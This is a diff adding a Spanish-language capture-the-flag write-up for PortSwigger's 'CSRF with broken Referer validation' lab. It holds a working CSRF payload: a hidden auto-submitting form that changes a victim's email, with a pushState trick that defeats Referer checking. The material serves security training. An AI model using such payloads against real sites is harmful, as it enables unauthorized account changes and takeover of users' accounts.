@@ -492,6 +492,23 @@ Autenticados en el laboratorio, ejecutamos la funcionalidad Change Email interce
 </script>
 ```
 
+### [CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)
+
+Analaizando la request de Change Email, vemos que solo acepta urls del dominio del laboratorio.
+Similar al laboratorio anterior, solo que esta vez alteramos el header Referer con la primera línea del script del siguiente exploit.
+
+#### Solución:
+
+```html
+<form method="POST" action="https://acb91f5f1e79c23180f5059000d40092.web-security-academy.net/email/change-email">
+    <input type="hidden" name="email" value="algo@mail.com">
+</form>
+<script>
+    history.pushState("", "", "/?acb91f5f1e79c23180f5059000d40092.web-security-academy.net");
+    document.forms[0].submit();
+</script>
+```
+
 ---
 
 ## [Clickjacking](https://portswigger.net/web-security/clickjacking)
